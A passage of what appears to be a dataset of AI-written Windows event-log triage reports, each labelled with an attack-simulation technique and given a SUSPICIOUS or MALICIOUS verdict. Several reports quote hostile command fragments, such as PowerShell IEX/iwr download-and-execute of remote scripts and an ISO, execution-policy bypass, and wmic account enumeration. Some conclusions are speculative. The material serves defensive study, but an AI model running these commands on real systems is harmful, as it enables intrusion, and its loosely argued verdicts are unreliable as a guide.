   - Several instances of standard system utility executions (e.g., `wevtutil.exe`, `cmd.exe`, `whoami.exe`, `hostname.exe`, and `wmic.exe`) are logged frequently, predominantly by the user `SERVER002\admin_test`, indicating potential maintenance tasks or user scripts. These commands are commonly used by attackers for reconnaissance and information gathering, which merits further scrutiny.
   - **Frequent Execution**: The frequency of these commands being executed in a short timespan, especially the use of `wmic qfe get description,installedOn /format:csv`, might be a normal cleanup or auditing script, but without context, it raises suspicion. An investigation into the necessity and history of these commands would be needed.
   - No unusual command-line strings or parameters were observed that could strongly signify malicious behavior.
   
3. **Application Log:**
   - **Software Protection Platform Service Event (ID 16384)**: It appears to be benign and relates to expected behavior of license or rules checks typically seen in Microsoft systems.

4. **System Log:**
   - Consistent with Security Log time changes with additional confirmation, performed by `svchost.exe`.

### Assessment:

Overall, while there are elements in these logs that could raise suspicions, such as the time change events and the rapid, repeated execution of system utilities by the `admin_test` account, there is no definitive presence of malicious activity. The behavior could be attributed to misconfigured or overly verbose scripts, legitimate maintenance tasks, or system updates. 

### Resolution:

Given the information available, I recommend categorizing this activity as **SUSPICIOUS**. This means further investigation is warranted to understand the root cause of the events, especially investigating:
- The `admin_test` account activities and permissions.
- Any scripts or scheduled tasks running on the system that could be producing these events.
- The context surrounding the time change events and whether they align with normal or expected administrative activity.

### Guidance:

- Verify the purpose and authorization for the `admin_test` account's actions. Review the account's recent login history and activity logs for patterns.
- Consult with the server's administrators to confirm any scheduled or recent changes/updates that might explain these logs.
- Monitor the system closely for any anomalies or recurrence of similar activities. Establish alerts for unusual behavior such as rapid, repeated executions of sensitive system utilities."
ATHPowerShellCommandLineParameter -EncodedCommand parameter variations,"Upon analyzing the provided Windows event logs, I identified the following notable activities:

1. **PowerShell Activity**:
   - There are multiple instances indicating PowerShell was executed on the system, specifically with the command line `""powershell.exe"" & {Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -Execute -ErrorAction Stop}`.
   - The use of encoded or obfuscated command variations is commonly associated with malicious activities to evade detection.

2. **Process Execution**:
   - We observe a series of wevtutil.exe executions. Wevtutil is a legitimate Windows utility used for managing event logs, but it can also be used by attackers to clear logs, which may be a sign of cover-up activity.
   - The frequent appearance of `conhost.exe` shortly after `wevtutil.exe` and PowerShell executions is suspicious as conhost.exe is used to host command line interfaces.   

3. **System Updates**:
   - The Windows Update Client logs indicate routine update activities which appear normal and are unrelated to potential malicious behavior.

4. **Application Log**:
   - The presence of a Software Protection Platform Service (sppsvc.exe) related entry in the Application log seems benign and indicates usual licensing checks.

5. **Privilege Level and User Activity**:
   - The events show that actions were executed with a high integrity level and under the user ""SERVER002\\admin_test"". This indicates high privileges were used, which is often necessary for potentially malicious activity.

6. **Command Line Observations**:
   - The `whoami.exe` and `hostname.exe` commands are observed being executed. These can be used for information gathering to verify user context and network configuration but are not inherently malicious. However, their proximity to the PowerShell activity raises concern.

**Assessment and Conclusion**:
- The logs show frequent PowerShell usage with obfuscated command lines and `wevtutil.exe` execution. This combination along with high integrity level execution suggests suspicious activity, as these are often indicators of potential misuse or infiltration.
- There is no definitive evidence of exploitation or compromise, but the behavior observed raises concerns and merits further investigation.

**Resolution**: **SUSPICIOUS**
- The actions observed, especially the use of PowerShell with potentially obfuscating parameters, are indicative of suspicious activity that could be associated with an attack or compromise.
- It is advisable to conduct a deeper investigation into the context and origin of these events, and monitor for similar activities moving forward.

**Guidance**:
- Investigate the source and intent of the PowerShell commands executed.
- Confirm if the `wevtutil.exe` was used to manage logs through legitimate administrative activities or if it might be an attempt to cover tracks.
- Enhance monitoring for similar process executions or any further suspicious PowerShell activity.
- Review access controls and privilege usage of the user ""SERVER002\\admin_test""."
OSTap Style Macro Execution,"### Detailed Analysis

#### Anomalies and Suspicious Behavior:

1. **PowerShell Usage and Script Execution:**
   - There are several instances where `powershell.exe` was executed with command lines that included downloading and executing scripts from an external source (`https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1`). This is commonly associated with malicious activity, as it indicates the download and execution of potentially harmful scripts from the internet.
   
2. **Unusual File and Script Operations:**
   - The PowerShell command includes writing to a file `C:\Users\Public\art.jse` and executing it using `cscript.exe`. This behavior is characteristic of a malicious script attempting to execute further payloads or establish persistence.

3. **Frequent Use of System Utilities:**
   - Several Sysmon events indicate the use of `wevtutil.exe`, a command-line tool for managing Windows Event logs, which was executed multiple times. This could suggest an attempt to clean or manipulate logs, a tactic used by adversaries to cover their tracks.
   
4. **Launch of Processes with High Integrity Level:**
   - Processes such as `whoami.exe` and `hostname.exe` were executed, which is unusual unless used for reconnaissance. The execution of `whoami.exe` at a high integrity level by the admin user `SERVER002\admin_test` raises red flags about potential privilege escalation attempts.

5. **Executing Scripts with Elevated Privileges:**
   - The presence of the `SeDebugPrivilege` and other high-impact privileges for `SYSTEM` indicates potential for privilege abuse, particularly with other evidence of scripting activity.

6. **Network Service Process Execution:**
   - The presence of `svchost.exe` in logs is typical for Windows, but in conjunction with other suspicious activities, it requires attention. It is often used in attacks to masquerade as legitimate services.

#### Indicators of Compromise:

- **PowerShell Command Injection**: Execution of PowerShell commands to download and run external scripts suggest command and control (C2) communication.
- **Potential Persistence Mechanisms**: Writing and executing a script (`art.jse`) indicates an attempt to establish persistence or deliver additional payloads.
- **Log Manipulation**: Use of `wevtutil.exe` may point to attempts at log tampering.

Malicious Execution from Mounted ISO Image,"### Detailed Analysis of the Logs:

Upon analysis of the provided logs, a potential indicator of malicious activity is observed, particularly within the Windows PowerShell logs and corresponding Sysmon logs.

1. **Suspicious PowerShell Activity:**
   - There are multiple PowerShell log entries indicating a PowerShell script utilizing `Invoke-Expression (IEX)` to execute remote content (`iwr ""https://raw.githubusercontent.com/file/file-file/master/files/data.003/src/qbot-test.iso""`) and downloading an ISO file to the local system (`$env:TEMP\\qbot-test.iso`).
   - The script mounts this ISO file as a disk image and attempts to execute a file (suspiciously named `calc.exe.lnk`) from the mounted path.
   - The usage of `Invoke-WebRequest` to retrieve potentially malicious content from a GitHub URL and executing it via PowerShell is a well-documented technique in many attacks. This is highly suspicious and indicative of a potential malware delivery mechanism.

2. **Unusual Process Execution:**
   - Sysmon logs also show processes related to PowerShell execution, matching timestamps and correlating with the PowerShell events. The execution of `cmd.exe` with arguments attempting to invoke `calc.exe` through command-line, specifically invoked from the mounted path (`E:\\`) as seen at 18:30:11, is suspicious.
   - The presence of `calc.exe` is often used as a placeholder or decoy payload in malware scripts and red-team exercises, making this activity stand out.

3. **Network and System Activity:**
   - The Edge Update logs show regular, benign activity consistent with automatic updates. However, the key focus lies in PowerShell and Sysmon events which are not typical for legitimate system administration or automation scripts.
   - Security logs note a series of successful logons which appear standard for system processes and lack direct evidence of abuse within the timeframe of the suspicious PowerShell activity.

4. **Security Products:**
   - The Application logs note Windows Defender is in an active state, signaling an updated antivirus, yet it appears that the script execution bypassed any immediate detection, stressing the potential sophistication or custom nature of the payload.

### Assessment of the Situation:

- **Threats or Risks Identified:**
  - The use of PowerShell to download and mount external content signifies a major security risk, potentially leading to unauthorized software installation or malware execution. This activity, aligned with Sysmon events, suggests a direct attempt to install/run unauthorized software potentially designed for malicious purposes.

- **Guidance on How to Proceed:**
  - Immediate isolation of the affected host (Server002) from the network to prevent potential lateral movement or exfiltration.
  - Conduct a thorough forensic investigation on Server002 to capture memory, analyze potential new files or changed configurations, and identify persistence mechanisms.
  - Scrutinize network logs for any unexpected outbound connections, especially related to the PowerShell activity.

### Resolution:
Based on the provided logs and identified indicators, the resolution is deemed **MALICIOUS** due to the strong evidence of potentially harmful scripting activity that aligns with typical malicious behavior seen in cyber attacks.
"
Cobalt Strike Artifact Kit pipe,"Upon analyzing the provided Windows event logs, here are the key findings:

1. **Processes from Non-Standard Locations:**
   - The presence of processes like `namedpipes_executor.exe`, `namedpipes_client.exe`, and `namedpipes_server.exe` being executed from the `C:\Users\ADMIN_~1\AppData\Local\Temp\Externalfiles\build\` directory is suspicious. Typically, system and application processes are not executed from temporary directories. This could be indicative of potentially unauthorized or malicious executables being run.

2. **Use of PowerShell:**
   - The logs indicate the use of `powershell.exe`, which is often leveraged by attackers due to its powerful capabilities, especially in post-exploitation scenarios. While PowerShell usage by itself is not necessarily malicious, combined with other anomalies, it warrants further scrutiny.

3. **Console Host Processes (`conhost.exe`):**
   - Numerous `conhost.exe` processes are logged; however, they appear to be spawned legitimately by system services like `sc.exe` and `hostname.exe`, which are typical behavior for many administrative tasks.

4. **Process Hierarchies:**
   - The process hierarchy indicates service control (`sc.exe`) executions starting services without unusual command lines or parameters. These include system processes such as `wuauserv` (Windows Update) and `PushToInstall`, which align with routine operations.

5. **Security Auditing Logs:**
   - Multiple logon events (Event ID 4624) using service accounts and SYSTEM user context were observed, exhibiting elevated privileges (`SeDebugPrivilege`, `SeTcbPrivilege`, amongst others). While high privileges are necessary for many system tasks, they can also be exploited for malicious purposes. However, there is no direct evidence of privilege misuse.
   - Event ID 5379 indicates failed credential validation attempts related to `MicrosoftAccount`, which might be a result of misconfigurations or could signal attempted access with incorrect credentials, though not necessarily malicious.

6. **Edge Update Activities:**
   - There are several logs concerning Microsoft Edge Update processes. These activities involve updating and registering components related to Microsoft Edge, which is typical for routine browser maintenance.

**Assessment:**
- The recurring execution of potential staging executables (`namedpipes_*`) from a temporary directory and the use of PowerShell are suspicious and warrant closer investigation.
- Other activities such as Edge updates and system services running `conhost.exe` and `sc.exe` appear typical and do not show signs of immediate malicious activity on their own.

**Resolution: SUSPICIOUS**
- Given the presence of executables running from non-standard directories and the use of `powershell.exe`, there's an indication that further investigation is needed to determine the legitimacy and intent of these actions.
- It is advised to conduct a more thorough investigation into the source and purpose of the executables running from the temporary directory and check for any unauthorized scripts or commands executed via PowerShell. Additionally, secure and reassess systems for unauthorized changes or security breaches."
Pipe Creation - PsExec Tool Execution From Suspicious Locations,"Upon analyzing the provided Windows event logs, several patterns and potential indicators of compromise stand out. Let's break them down:

1. **Usage of PsExec:**
   - The System log entry with EventID 7045 indicates the installation of `PSEXESVC` as a service on `Server002`. PsExec is a legitimate tool developed by Sysinternals, often used for remote process execution. However, it's also commonly leveraged by attackers for lateral movement within a network due to its ability to execute commands remotely with high privileges.
   - Multiple Sysmon events show the execution of `PSEXESVC.exe` and associated processes (`cmd.exe`), running under the `NT AUTHORITY\SYSTEM` account, indicating high privilege operations.

2. **Suspicious PowerShell Activity:**
   - The Windows PowerShell log shows several events where PowerShell was used to execute `script.exe` from a temporary directory (`C:\\Users\\Public\\Temp\\`). The command used, particularly with `-accepteula`, suggests automated or scripted activity, which could be malicious in nature.
   - Additional PowerShell logs show further scripted activity with a focus on writing results and scanning through `.inf` files. The use of PowerShell with altered execution policies and automation is frequently seen in malicious scripts.

3. **High Privilege Logons and Privilege Assignments:**
   - Security logs show multiple instances of administrative logons with elevated privileges (e.g., `SeDebugPrivilege`, `SeBackupPrivilege`). The user `admin_test` engaged in actions with significant privileges, which could indicate potential misuse or compromise of legitimate admin credentials.

4. **Security Threats and Risks:**
   - The usage of tools like PsExec combined with script execution (potentially unauthorized) represents a risk of lateral movement, stealth execution, and increased control by an attacker across the network.
   - High privilege PowerShell activities potentially expose the system to unauthorized access to sensitive information or critical system changes.

### Assessment and Resolution:
Given the use of potentially dual-purpose administrative tools (PsExec, PowerShell) under suspicious conditions, the logs reveal indicators that don't conform to regular administrative operations. There's evidence suggesting that these activities are potentially part of a malicious campaign utilizing compromised credentials and scripts for lateral movement and remote execution. 

### Resolution:
- **SUSPICIOUS**: The logs contain activity that requires further investigation. There's a strong case for potential malicious activity but requires verification against known administrative behavior, validation from the involved users, and correlation with other security alerts or findings in the network.

### Recommended Actions:
1. **Conduct Forensic Review:** Investigate the origin and authenticity of any scripts executed (e.g., `script.exe`) on `Server002`. Determine whether the related activities were authorized.
2. **Network and Host Monitoring:** Increase monitoring for PsExec usage and PowerShell executions, and consider implementing logging for command lines and script content.
3. **Review User Activity:** Audit and review the actions performed by high-privilege accounts like `admin_test`. Validate whether any adjustments (e.g., password changes or privilege limitations) are necessary.
4. **Enhance Security Policies:** Consider restricting the use of administrative tools such as PsExec and PowerShell through Group Policy and Endpoint Protection tools, to prevent unauthorized access and execution."
Cobalt Strike post-exploitation pipe (4.2 and later),"After a detailed analysis of the provided logs, here is the assessment:

### Suspicious Observations:

1. **Privilege Escalation:**
   - The Event ID 4672 in the Security log indicates that the account ""admin_test"" was assigned special privileges, including `SeDebugPrivilege` and `SeImpersonatePrivilege`, which can be used for privilege escalation or more deeply inspect and manipulate other processes.

2. **Unusual Logon Activity:**
   - Event ID 4624 shows a logon with NTLM authentication from a workstation ""DESKTOP-3HL5B2P"" with an IPv6 address, which could be unusual if not typically expected in this environment for the ""admin_test"" account, especially from a remote source.

3. **Command Execution from Sensitive Directory:**
   - There is an execution of `cmd.exe` with a command line executing `namedpipes_executor.exe`, along with `namedpipes_server.exe` and `namedpipes_client.exe`, located in a temporary directory. This is unusual and concerning as named pipes can be used in lateral movement or unauthorized data exchange.

4. **Frequent Use of System Utilities:**
   - The frequent execution of system utilities like `wevtutil.exe`, `cmd.exe`, `whoami.exe`, and `powershell.exe` can indicate reconnaissance or attempts to manipulate system configurations or logs.

### Malicious Indicators:

- The execution of executables from temporary directories which are not standard Windows directories and involvement of named pipes in the context of these logs might imply potential malicious activity particularly related to covert communication or data exfiltration attempts.

- The use of high integrity processes and capabilities obtained lend more concern to these activities being used for high-impact purposes.

### Resolution: MALICIOUS

Based on these findings:

- **Threat:** The execution of several non-standard executables and named pipes interactions suggests potential malicious activities or the system might be compromised.
- **Risk:** Potential for data exfiltration, unauthorized access, and lateral movements.
  
### Recommendations:

1. Immediately quarantine the ""Server002"" host to prevent any further possible spread beyond the system.
2. Conduct a full forensic analysis on ""Server002,"" focusing on executed processes, network connections, and file changes to uncover any further hidden threats or backdoors.
3. Reset credentials for the ""admin_test"" account and monitor for any unauthorized access attempts.
4. Enhance logging and monitoring for similar suspicious activities across other systems in the network to quickly detect and respond to further incidents.
5. Educate and train staff to understand similar attack indicators and foster a proactive security posture.

This assessment concludes with the recommendation to treat the situation as potentially harmful, ensuring further actions are taken to secure infrastructure integrity."
WMI Reconnaissance List Remote Services,"Upon analyzing the provided Windows event logs, several points stand out that require careful consideration:

1. **Time Change Events**: Multiple events show the system time being manipulated. Specifically:
   - Event ID 4616 from the Security log indicates that the system time was changed back and forth (PreviousTime and NewTime indicate the times before and after adjustment).
   - System Kernel-General Event IDs 1 and 24 correlate with this, indicating an update of the system time via `svchost.exe`.
   - The precise manipulation of time is often a technique used to evade detection mechanisms or mislead log audits; although legitimate causes exist, such as automatic synchronization with an NTP server, it should be investigated further.

2. **High Privilege Logons and Actions**: 
   - Security Event ID 4672 logs show an account (admin_test) being granted several high-level privileges. This includes SeDebugPrivilege and SeLoadDriverPrivilege, which can allow for significant control over the system.
   - A logon (Security Event ID 4624) using the NTLM authentication process with the same user account (admin_test) indicates remote authentication, which could align with legitimate admin activities or a potential compromise.

3. **Sysmon Process Creations**:
   - Several instances of `wevtutil.exe` and `conhost.exe` executions are noted in Sysmon logs, all linked to the admin_test account. `wevtutil.exe` is used for managing event logs, and its frequent execution could signify log tampering or extraction attempts.
   - The `whoami.exe` and `cmd.exe` processes executed under high integrity levels indicate the user was performing system-level information queries and actions.
   - Particularly of note is a `cmd.exe` command executing `wmic` to query for spooler services. While potentially benign, this specific query pattern is suspicious as it can indicate enumeration for further exploitation.

**Conclusion**: The series of logs highlight activities that are somewhat anomalous, particularly the system time changes, usage of high-privilege commands, and detailed accounts of sysmon events involving log utility and command executions. Combined, these could indicate attempts by a user (or malicious actor) to cover the tracks of additional actions on the system or further abuse the system under an elevated privilege context.

**Resolution**: SUSPICIOUS
- Given the suspicious log activities, further investigation is warranted to ascertain whether these actions are malicious or part of legitimate administrative tasks.
- Recommended actions include verifying the legitimacy of the user admin_test, reviewing corresponding network logs for suspicious remote access, and conducting a deeper forensic analysis, especially focusing on why system time changes occurred and if any unauthorized data modifications or exfiltrations took place."
WMI Reconnaissance Users,"**Detailed Analysis of the Event Logs**

The analysis of the provided event logs focuses on identifying any suspicious or anomalous behavior related to malicious activity, seeking cases of unusual process execution, command-line arguments, privilege escalation, or any other signs of potential compromise.

### Observations

1. **Security Log Events:**

   - **Event ID 4616:** This indicates the system time was changed. Notably, the `PreviousTime` is ahead of the `NewTime`, suggesting the system clock was set backward. The process responsible is `svchost.exe`, a legitimate Windows process. However, time changes can sometimes be indicative of attempts to circumvent time-based security controls or cover tracks.

   - **Multiple Event ID 4672 (Special Privileges Assigned to New Logon):** This event indicates that the account `admin_test` received multiple high-level privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc. While having such privileges can be legitimate for administrative accounts, unusual logon activities require careful examination.
   
   - **Event ID 4624 (Successful Logon):** There are successful logons for the `admin_test` account using NTLM authentication from external IPv6 addresses. While NTLM authentication is generally used within or across trusted environments, there is the potential for NTLM relay attacks if not appropriately secured.

   - **Event ID 4798 (Local Group Membership Enumeration):** This event indicates enumeration of group memberships by the `admin_test` account using `WmiPrvSE.exe`. Enumeration activities can be a normal administrative task or preparatory reconnaissance during an attack.

2. **Sysmon Log Events:**

   - Processes such as `wevtutil.exe`, `conhost.exe`, and `hostname.exe` executed by `admin_test`. These might be typical, though it is worth checking the context of this activity further. Particularly, `wevtutil.exe` is used for event log management, potential misuse could indicate an attempt to manipulate logs.

   - The execution of `cmd.exe` with the command `wmic useraccount get /ALL /format:csv`. This action enumerates user accounts and could indicate reconnaissance activities often performed during lateral movement phases of attacks.

3. **System Log Events:**

   - System events showcase additional confirmations of time change activities previously observed in the security log extracted through `svchost.exe`.

### Assessment

- **Behavior Analysis:** There are multiple indicators that suggest potentially anomalous behavior. These include system time changes, the assignment of special privileges to a user, enumeration of user accounts, and local group membership enumeration. 

- **Potential Compromise Evidence:** The logs show behavior consistent with reconnaissance activities and possible privilege escalation attempts, both of which suggest the potential for malicious activity. However, without direct evidence such as malware artifacts or unauthorized data access, it cannot be conclusively determined to be malicious.

### Risks & Threats

- **NTLM Authentication:** External source logins using this protocol should be scrutinized as it might expose the system to relay attacks or unauthorized access.

- **Privilege Enumeration:** Indicates potential preparations for privilege escalation or operational disruption.

### Recommendations and Next Steps

1. **Detailed Audit of `admin_test`:** Verify whether the observed activities align with known administrative tasks for this user account.

2. **Review Time Change Events:** Legitimize time change events and understand the implications concerning time-sensitive security controls.

3. **Network Traffic Analysis:** Investigate the external IP addresses linked to successful logon events to rule out any unauthorized access.

4. **Advanced Endpoint Detection:** Apply EDR solutions to monitor and flag similar activities for further analysis.

5. **Security Best Practices:** Ensure that proper security measures, including monitoring policies and secure communication protocols, are in place.

**Resolution: SUSPICIOUS**

The activities noted are suspicious due to time-altering activities, privilege assignments, and enumeration tasks typically in line with attack reconnaissance phases. Further investigation is warranted to determine the legitimacy or extent of potential compromise."
Command Prompt read contents from CMD file and execute,"### Event Log Analysis

#### Review of Sysmon and Application Logs

1. **Process Execution**
   - **PowerShell Execution**:
     - EventRecordID `17960` shows the execution of `powershell.exe` by the user `SERVER002\admin_test`. PowerShell is often used for both legitimate administrative tasks and malicious activities. However, this log does not display any command-line arguments specifying malicious behavior.
   - **Unknown Process**:
     - EventRecordID `17961` involves an `unknown process`, which is unusual and might indicate process injection or an unlogged process creation.
   - **Command Prompt Activity**:
     - The logs show frequent execution of `cmd.exe` with various complex command lines. For instance, EventRecordID `17990` shows `cmd.exe` executing a command from a temporary directory. Such behavior might indicate attempts to automate tasks or possibly hide command execution.
   - **Calculator Execution**:
     - EventRecordID `17995` logs the execution of `calc.exe` which originated from a `cmd.exe` child process. During investigations, executing calculator through command prompt might be a technique to hide malicious intent or test system responsiveness by a threat actor.

2. **Privilege and Integrity Level**
   - Several processes, including `cmd.exe`, `calc.exe`, and system update tools, operate at a high integrity level, heightening the risk if these processes were manipulated maliciously.

3. **Edge Update Activities**:
   - Multiple entries showing activity related to `Microsoft Edge Update`:
     - Normal operations for updating Microsoft Edge. Processes execute under `NT AUTHORITY\SYSTEM`, indicating legitimate service update actions, though also carries risks if hijacked.

4. **Process Execution Context**
   - Logs show `wevtutil.exe` and `conhost.exe` being spawned, which are normal operations; however, spikes in their execution could be indicative of log clearing or manipulation attempts.

#### Identified Risks and Concerns

- **Potential Malicious Indicators**:
  - High frequency of command-line spawned processes (`cmd.exe`, `powershell.exe`): can be linked to file-less malware attacks.
  - The presence of `unknown process` entry raises suspicion of possible stealthy activities not properly logged due to process injection or evasion techniques.

- **Potential False Positives**:
  - Multiple updates related to Microsoft Edge running as system level can be typical but should be corroborated with corporate update policies.

- **Benign Activities**:
  - Most logs related to system updates and calculator executions might be benign but require context about user actions.

### Recommendation and Conclusion

Given the above analysis, the logs mainly show actions that could be part of a normal update process but also include potentially suspicious elements requiring further investigation:

- **Resolution**: **SUSPICIOUS**
  - Further investigation is warranted, specifically scrutinizing the context of the unknown process and frequent command-line activities. It is recommended to:
    - Verify with IT whether executing calculator is standard for the `admin_test` user.
    - Cross-check with asset management if PowerShell executions from logs are expected.
    - Consider running memory forensics to detect potential process injections associated with the unknown process entry.
    - Review scheduled tasks or active services for anomalous patterns."
Powershell MsXml COM object - with prompt,"After conducting a detailed analysis of the provided logs, I have identified several indicators of malicious activity. Below are my findings:

### Suspicious or Anomalous Behavior:
1. **Time Anomaly (Security and System Logs):**
   - The Security and System logs show evidence of time alteration events (EventID 4616 in Security and EventID 1, 24 in System). The time was set back slightly within the same minute, which could be used as an anti-forensic measure to hide tracks of malicious activity.

2. **Suspicious PowerShell Activity (Windows PowerShell Log):**
   - There is a clear indication of a malicious PowerShell command execution: `powershell.exe -exec bypass -noprofile ...`. This command is used to bypass execution policies and is often indicative of script-based attacks, such as downloading and executing malicious scripts from an external source (`https://raw.githubusercontent.com/file/file-file/master/files/data.001/src/test.ps1`).

3. **Malicious Script Execution (Sysmon Log):**
   - A command via `cmd.exe` is initiating PowerShell to execute the same suspicious script found in the PowerShell log. The command uses the `-exec bypass -noprofile` flags, which are indicative of attempts to run a PowerShell script without restrictions.

4. **Privileged Process Executions (Sysmon Log):**
   - Multiple instances of system utilities like `whoami.exe`, `cmd.exe`, and PowerShell executed consecutively and with high integrity levels. These could be used for reconnaissance, lateral movement, or privilege escalation activities.

### Conclusion:
Given the nature of the findings, particularly the use of PowerShell to execute a remote script, alteration of system time, and suspicious command-line executions, the logs strongly suggest malicious activity.

### Resolution:
- **MALICIOUS**: The activities observed in the logs indicate a clear sign of compromise, requiring immediate attention and remediation.

### Guidance on How to Proceed:
1. **Immediate Quarantine and Investigation:**
   - Isolate the affected host (Server002) from the network to prevent any potential spread of malicious activity.
   
2. **Conduct a Thorough Investigation:**
   - Analyze network traffic from this host around the time of these logs to identify any external communication.
   - Verify the contents and area of impact of the downloaded script by examining associated network traffic and host files.

3. **Remediation:**
   - Remove the malicious script or any files it may have affected.
   - Ensure that the system is patched and updated to prevent any exploitation of vulnerabilities.
   - Evaluate and reset potentially compromised credentials.

4. **Strengthen Security Posture:**
   - Review and enhance PowerShell logging settings and restrain execution policies to whitelist-based models.
   - Consider deploying enhanced endpoint detection and response tools for better visibility and protection.
   - Conduct a company-wide security audit to prevent future incidents and educate users about phishing and script-based attacks.

This assessment is based on the explicit indicators discovered in the logs, suggesting immediate steps should be taken to mitigate any potential threats."
